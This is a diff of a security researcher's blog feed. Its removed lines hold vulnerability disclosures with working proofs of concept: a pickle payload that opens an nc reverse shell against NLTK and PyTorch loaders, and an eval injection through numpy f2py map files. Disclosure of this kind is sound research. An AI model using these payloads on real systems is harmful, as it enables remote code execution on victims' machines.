@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-07-15T15:37:37+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Overwrite in jupyter notebook</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite in jupyter notebook" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-07-22T17:29:24+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Arbitrary File Overwrite in jupyter notebook</title><link href="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html" rel="alternate" type="text/html" title="Arbitrary File Overwrite in jupyter notebook" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/07/09/arbitrary-file-overwrite-in-jupyter-notebook.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Arbitrary File Overwrite in jupyter notebook</p>
@@ -95,10 +95,10 @@ The vulnerable function <a href="https://github.com/jupyter/notebook/blob/633c5b
 
 <h3 id="impact">Impact</h3>
 
-<p>If a victim installs a malicious tarball extension, the tarball will be extracted outside the target directory and cause arbitrary file overwrite.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Local File Inclusion in Solara</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html" rel="alternate" type="text/html" title="Local File Inclusion in Solara" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html"><![CDATA[<h2 id="name">Name</h2>
+<p>If a victim installs a malicious tarball extension, the tarball will be extracted outside the target directory and cause arbitrary file overwrite.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">CVE-2024-39903: Local File Inclusion in Solara</title><link href="http://localhost:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html" rel="alternate" type="text/html" title="CVE-2024-39903: Local File Inclusion in Solara" /><published>2024-07-09T10:31:06+08:00</published><updated>2024-07-09T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/07/09/local-file-inclusion-in-solara.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
-  <p>Local File Inclusion in Solara</p>
+  <p>CVE-2024-39903: Local File Inclusion in Solara</p>
 </blockquote>
 
 <h2 id="weakness">Weakness</h2>
@@ -239,463 +239,11 @@ def get_from_cache(base_cache_dir: pathlib.Path, path):
 
 <h3 id="impact">Impact</h3>
 
-<p>Any file on the backend filesystem can be read by an attacker with access to the solara server directly(If reverse proxy server such as nginx is used, the path parameter will be blocked).</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Unsafe eval via f2py in Numpy(Invalid)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html" rel="alternate" type="text/html" title="Unsafe eval via f2py in Numpy(Invalid)" /><published>2024-07-03T10:31:06+08:00</published><updated>2024-07-03T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html"><![CDATA[<h2 id="name">Name</h2>
+<p>Any file on the backend filesystem can be read by an attacker with access to the solara server directly(If reverse proxy server such as nginx is used, the path parameter will be blocked).</p>
 
-<blockquote>
-  <p>Unsafe eval via f2py in Numpy</p>
-</blockquote>
+<h2 id="reference">Reference</h2>
 
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-94: Code Injection</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="version">Version</h2>
-
-<blockquote>
-  <p>2.0.0</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p><a href="https://numpy.org/doc/stable/f2py/index.html#f2py-user-guide-and-reference-manual">F2PY</a> distributed as part of NumPy which is used to convert fortan module to python module. It will convert fortan module to C <code class="language-plaintext highlighter-rouge">.so</code> module for python to import. During conversion, F2PY needs to know what would be the corresponding C type and a general solution for that would be too complicated to implement. A json file containing fortan type to C type mapping can be passed to F2PY by using the <a href="https://numpy.org/doc/stable/f2py/advanced/use_cases.html#dealing-with-kind-specifiers">–f2cmap option</a> during conversion:</p>
-
-<p>The mapping file format:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Fortran typespec&gt; : {&lt;selector_expr&gt;:&lt;C type&gt;}
-</code></pre></div></div>
-
-<p>A mapping file example:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{'real': {'KIND(0.0D0)': 'double'}}
-</code></pre></div></div>
-
-<p>However, during loading of f2cmap file, <a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L138C5-L138C21">load_f2cmap_file</a> is called and <code class="language-plaintext highlighter-rouge">eval()</code> is used to parse the json content in the mapping file. If a victim loads a malicious mapping file, command injection can be achieved.</p>
-
-<p>The vulnerable sink: <a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_f2cmap_file(f2cmap_file):
-    global f2cmap_all, f2cmap_mapped
-
-    f2cmap_all = copy.deepcopy(f2cmap_default)
-
-    if f2cmap_file is None:
-        # Default value
-        f2cmap_file = '.f2py_f2cmap'
-        if not os.path.isfile(f2cmap_file):
-            return
-
-    try:
-        outmess('Reading f2cmap from {!r} ...\n'.format(f2cmap_file))
-        with open(f2cmap_file) as f:
-            # vulnerable to command injection
-            d = eval(f.read().lower(), {}, {})
-        f2cmap_all, f2cmap_mapped = process_f2cmap_dict(f2cmap_all, d, c2py_map, True)
-        outmess('Successfully applied user defined f2cmap changes\n')
-    except Exception as msg:
-        errmess('Failed to apply user defined f2cmap changes: %s. Skipping.\n' % (msg))
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>Firstly, let’s create a malicous mapping file named <code class="language-plaintext highlighter-rouge">mapfile.txt</code>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__import__('os').system('id')
-</code></pre></div></div>
-
-<p>Then, install numpy:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install --upgrade numpy
-</code></pre></div></div>
-
-<h3 id="start-attack">Start attack</h3>
-
-<p>Load <code class="language-plaintext highlighter-rouge">mapfile.txt</code> using <code class="language-plaintext highlighter-rouge">F2PY</code>:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f2py -c test.f --f2cmap mapfile.txt
-</code></pre></div></div>
-
-<p>Now let’s check the output, the command <code class="language-plaintext highlighter-rouge">id</code> is executed successfully:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>running build
-running config_cc
-INFO: unifing config_cc, config, build_clib, build_ext, build commands --compiler options
-running config_fc
-INFO: unifing config_fc, config, build_clib, build_ext, build commands --fcompiler options
-running build_src
-INFO: build_src
-INFO: building extension "untitled" sources
-INFO: f2py options: ['--f2cmap', 'mapfile.txt']
-INFO: f2py:&gt; /tmp/tmpgkxylea2/src.linux-x86_64-3.10/untitledmodule.c
-creating /tmp/tmpgkxylea2/src.linux-x86_64-3.10
-OSError: [Errno 2] No such file or directory: 'test.f'. Skipping file "test.f".
-Reading f2cmap from 'mapfile.txt' ...
-uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(netdev),1001(docker)
-</code></pre></div></div>
-
-<h2 id="colab">Colab</h2>
-
-<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing">https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing</a></p>
-
-<p><img src="https://live.staticflickr.com/65535/53834219079_360ff6894d_h.jpg" alt="poc" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. If victims load an malicious mapping file, command injection can be achieved.</p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Git remote origin leaks user access token(Invalid)</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html" rel="alternate" type="text/html" title="Git remote origin leaks user access token(Invalid)" /><published>2024-07-01T10:31:06+08:00</published><updated>2024-07-01T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Git remote origin leaks user access token</p>
-</blockquote>
-
-<h2 id="version">Version</h2>
-
-<blockquote>
-  <p>2.45.2</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>Lots of people are using personal access token to clone their private repository. To use a access token, you can include your username and token in https url to clone projects on github, gitlab or any other DevOps Platform:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://&lt;username&gt;:&lt;token&gt;@github.com/username/repository.git
-</code></pre></div></div>
-
-<p>However, we can get the token back easily by just using <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd privateProject
-git remote get-url origin
-&gt; https://username:ghp_xxxxx@github.com/username/repository.git
-</code></pre></div></div>
-
-<p>This can be dangerous, because we often run third party tools in our private repository. If a malicious tool runs <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>, it can steal our personal access token of github or gitlab. In this case, our github/gitlab will be controlled by attackers which can have severe consequences.</p>
-
-<p>I found this issue during code auditing via <a href="https://github.com/pyupio/safety">safety tool</a>. After scanning a project using <code class="language-plaintext highlighter-rouge">safety check -r requirements.txt --save-json test.json</code>, safety saved results into <code class="language-plaintext highlighter-rouge">test.json</code> file. However, when I looked into <code class="language-plaintext highlighter-rouge">test.json</code>, I found my personal access token in this file.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>"report_meta": {
-    "scan_target": "files",
-    "scanned": [
-        "/home/kali/huntr/azure-sdk-for-python/tools/azure-sdk-tools/ci_tools/versioning/requirements.txt"
-    ],
-    "target_languages": [
-        "python"
-    ],
-    "git": {
-        "branch": "main",
-        "tag": "",
-        "commit": "b182b0c4f9d07d18f118130bc941c3b7a75667b1",
-        "dirty": false,
-        "origin": "https://outh2:ghp_xxxx@github.com/sunriseXu/xxxx.git"
-    },
-}
-</code></pre></div></div>
-
-<p>So, I looked into the source code of safety. The class <a href="https://github.com/pyupio/safety/blob/f15d7908d27fd887dcc6b31237b8e3df79a9359b/safety/scan/util.py#L49"><code class="language-plaintext highlighter-rouge">GIT</code></a> is responsible for collecting repository information in current repo where safety runs.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class GIT:
-    ORIGIN_CMD: Tuple[str, ...] = ("remote", "get-url", "origin")
-    def __run__(self, cmd: Tuple[str, ...], env_var: Optional[str] = None) -&gt; Optional[str]:
-        if env_var and os.environ.get(env_var):
-            return os.environ.get(env_var)
-
-        try:
-            return subprocess.run(self.git + cmd, stdout=subprocess.PIPE, 
-                                    stderr=subprocess.DEVNULL).stdout.decode('utf-8').strip()
-        except Exception as e:
-            LOG.exception(e)
-        
-        return None
-    def origin(self) -&gt; Optional[str]:
-        # get the origin of repository
-        return self.__run__(self.ORIGIN_CMD, env_var="SAFETY_GIT_ORIGIN")
-</code></pre></div></div>
-
-<h2 id="impact">Impact</h2>
-
-<p>This can have severe consequences. <strong>Any</strong> tools running in private repositories have ability to steal personal access token if the token is written in git remote url explicitly. Git should mask user’s access token when using cli command <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in nltk.data.load in NLTK(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in nltk.data.load in NLTK(Informative)" /><published>2024-06-28T10:31:06+08:00</published><updated>2024-06-28T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Command injection via unsafe pickle.loads in nltk.data.load</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-94: Code Injection</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="version">Version</h2>
-
-<blockquote>
-  <p>3.8.1</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The NLTK api <a href="https://www.nltk.org/api/nltk.data.html?highlight=load#nltk.data.load"><code class="language-plaintext highlighter-rouge">nltk.data.load</code></a> is used to load a given resource from the NLTK data package, and it supports load pickle packages from remote sources. However, after the pickle file is downloaded, it uses <code class="language-plaintext highlighter-rouge">pickle.load</code> method to load the file which causing a malicious pickle file executing arbitrary code on victim’s mechine.</p>
-
-<p>The vulnerable function: <a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754"><code class="language-plaintext highlighter-rouge">nltk.data.load</code></a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load(
-    resource_url,
-    format="auto",
-    cache=True,
-    verbose=False,
-    logic_parser=None,
-    fstruct_reader=None,
-    encoding=None,
-):
-    
-    resource_url = normalize_resource_url(resource_url)
-    resource_url = add_py3_data(resource_url)
-
-    ...
-    # Load the resource.
-    opened_resource = _open(resource_url)
-
-    if format == "raw":
-        resource_val = opened_resource.read()
-    elif format == "pickle":
-        # vulnerable to code execution attacks !!!!!
-        resource_val = pickle.load(opened_resource)
-    elif format == "json":
-    ...
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>Firstly, create a malicious pickle file and upload to github.</p>
-
-<h3 id="payloadpickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></h3>
-
-<p>Use following snippets to create a malicous pickle payload:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-import os
-
-class RCE:
-    def __reduce__(self):
-        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
-               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
-        return os.system, (cmd,)
-
-with open('payload.py.debug_pkl', 'wb') as f:
-    pickle.dump(RCE(), f)
-</code></pre></div></div>
-
-<p>I have uploaded the <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle"><code class="language-plaintext highlighter-rouge">payload.pickle</code></a> to github for testing.</p>
-
-<h2 id="start-attack">Start attack</h2>
-
-<p>Install latest NLTK:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install nltk
-</code></pre></div></div>
-
-<p>Use following snippets to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from nltk.data import load
-load("https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle")
-</code></pre></div></div>
-
-<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
-prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
-</code></pre></div></div>
-<h2 id="colab">Colab</h2>
-
-<p>Tested on google colab: <a href="https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing">https://colab.research.google.com/drive/160HoB0-PdFqOzBoUch7hj3n9olm2sfS1?usp=sharing</a></p>
-
-<p><img src="http://live.staticflickr.com/65535/53820920049_03d7b6ff6e_h.jpg" alt="image" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. If victims load a malicious pickle file from remote sources using <code class="language-plaintext highlighter-rouge">nltk.data.load</code>, command injection can be achieved.</p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/nltk/nltk/blob/8c233dc585b91c7a0c58f96a9d99244a379740d5/nltk/data.py#L754">nltk.data.load#L754</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in torch.utils.model_dump in pytorch(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-pytorch.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Command injection via unsafe pickle.loads in torch.utils.model_dump</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-94: Code Injection</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="version">Version</h2>
-
-<blockquote>
-  <p>2.3.1</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>In pytorch module <a href="https://github.com/pytorch/pytorch/blob/main/torch/utils/model_dump/__init__.py"><code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code></a>, the method <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L189"><code class="language-plaintext highlighter-rouge">get_model_info</code></a> is responsible for extracting a model data in zip file. However, during the extraction, if a pickle file endswith <code class="language-plaintext highlighter-rouge">debug_pkl</code>, this file will be parsed by <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">pickle.loads</code> function</a>. In this case, if a <a href="https://book.hacktricks.xyz/pentesting-web/deserialization#pickle">malicous pickle file is parsed</a>, we can achive command injection in victim’s mechine.</p>
-
-<p>The vulnerable function: <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264"><code class="language-plaintext highlighter-rouge">get_model_info</code></a></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def get_model_info(
-        path_or_file,
-        title=None,
-        extra_file_size_limit=DEFAULT_EXTRA_FILE_SIZE_LIMIT):
-    """Get JSON-friendly information about a model.
-
-    The result is suitable for being saved as model_info.json,
-    or passed to burn_in_info.
-    """
-    ...
-    with zipfile.ZipFile(path_or_file) as zf:
-        
-        code_files = {}
-        for zi in zf.infolist():
-            if not zi.filename.endswith(".py"):
-                continue
-            with zf.open(zi) as handle:
-                raw_code = handle.read()
-            with zf.open(zi.filename + ".debug_pkl") as handle:
-                raw_debug = handle.read()
-
-            # Parse debug info and add begin/end markers if not present
-            # to ensure that we cover the entire source code.
-            # vulnerable sink!!!!!!!!!!
-            debug_info_t = pickle.loads(raw_debug)
-            
-    ...
-    return {"model": dict(
-        title=title,
-        file_size=file_size,
-        version=version,
-        zip_files=zip_files,
-        interned_strings=list(interned_strings),
-        code_files=code_files,
-        model_data=model_data,
-        constants=constants,
-        extra_files_jsons=extra_files_jsons,
-        extra_pickles=extra_pickles,
-    )}
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>Firstly, let’s create a malicous model, and compress it with zip format. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L230"><code class="language-plaintext highlighter-rouge">get_model_info#L230</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">version</code> file. In <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L238"><code class="language-plaintext highlighter-rouge">get_model_info#L238</code></a>, we know the model directory must contain <code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code> files. In line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L255"><code class="language-plaintext highlighter-rouge">get_model_info#L255</code></a> and line <a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L259"><code class="language-plaintext highlighter-rouge">get_model_info#L259</code></a>, we know that the model must contain a python file and a <code class="language-plaintext highlighter-rouge">debug_pkl</code> file. So, let’s create those files:</p>
-
-<h3 id="version-1"><code class="language-plaintext highlighter-rouge">version</code></h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.1.0
-</code></pre></div></div>
-
-<h3 id="datapkl-and-constantspkl"><code class="language-plaintext highlighter-rouge">data.pkl</code> and <code class="language-plaintext highlighter-rouge">constants.pkl</code></h3>
-
-<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">data.pkl</code> file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-student_names = [1]
-with open('data.pkl', 'wb') as f:
-    pickle.dump(student_names, f)
-</code></pre></div></div>
-
-<p>Use following snippets to create <code class="language-plaintext highlighter-rouge">constants.pkl</code> file:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-student_names = ["df"]
-with open('constants.pkl', 'wb') as f:
-    pickle.dump(student_names, f)
-</code></pre></div></div>
-
-<h3 id="payloadpy"><code class="language-plaintext highlighter-rouge">payload.py</code></h3>
-
-<p>Just create a empty file named <code class="language-plaintext highlighter-rouge">payload.py</code></p>
-
-<h3 id="payloadpydebug_pkl"><code class="language-plaintext highlighter-rouge">payload.py.debug_pkl</code></h3>
-
-<p>Use following snippets to create a malicous pickle payload:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import pickle
-import os
-
-class RCE:
-    def __reduce__(self):
-        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
-               '/bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 1234 &gt; /tmp/f')
-        return os.system, (cmd,)
-
-with open('payload.py.debug_pkl', 'wb') as f:
-    pickle.dump(RCE(), f)
-</code></pre></div></div>
-
-<h3 id="malicious-model-zip-file"><code class="language-plaintext highlighter-rouge">malicious model zip file</code></h3>
-
-<p>Copy all the files to a folder and create a model zipfile:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la torch-model-dump
--rw-r--r-- 1 kali kali   20 Jun 24 17:45 constants.pkl
--rw-r--r-- 1 kali kali   17 Jun 24 17:45 data.pkl
--rw-r--r-- 1 kali kali    0 Jun 24 17:45 payload.py
--rw-r--r-- 1 kali kali  121 Jun 24 17:45 payload.py.debug_pkl
--rw-r--r-- 1 kali kali    6 Jun 24 17:39 version
-
-&gt; zip -r torch-model-dump.zip torch-model-dump
-</code></pre></div></div>
-
-<p>The <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/torch-model-dump.zip"><code class="language-plaintext highlighter-rouge">torch-model-dump.zip</code></a> can be download from github.</p>
-
-<h2 id="start-attack">Start attack</h2>
-
-<p>Install latest pytorch:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install torch
-</code></pre></div></div>
-
-<p>Use following command to trigger the unsafe <code class="language-plaintext highlighter-rouge">pickle.loads</code> command injection:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m torch.utils.model_dump --style=json ./torch-model-dump.zip
-</code></pre></div></div>
-
-<p>After the command executed, we can check the <code class="language-plaintext highlighter-rouge">/tmp/f</code> file is created.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; ls -la /tmp/f
-prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
-</code></pre></div></div>
-<h2 id="colab">Colab</h2>
-
-<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing">https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing</a></p>
-
-<p><img src="/assets/images/bughunter/torch-pickle.png" alt="image" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. If victims parse a malicious model file using <code class="language-plaintext highlighter-rouge">torch.utils.model_dump</code>, command injection can be achieved.</p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264">get_model_info#L264</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt</title><link href="http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html" rel="alternate" type="text/html" title="Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/widgetti/solara/security/advisories/GHSA-9794-pc4r-438w">https://github.com/widgetti/solara/security/advisories/GHSA-9794-pc4r-438w</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt</title><link href="http://localhost:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html" rel="alternate" type="text/html" title="Zipslip when parsing invoice zip file via InvoiceOCRAssistant in metagpt" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/06/24/zipslip-in-metagpt</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/06/24/zipslip-in-metagpt.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Zipslip when parsing invoice zip file via InvoiceOCRAssistant</p>
@@ -832,16 +380,162 @@ await role.run(Message(content="Invoicing date", instruct_content=InvoicePath(fi
 
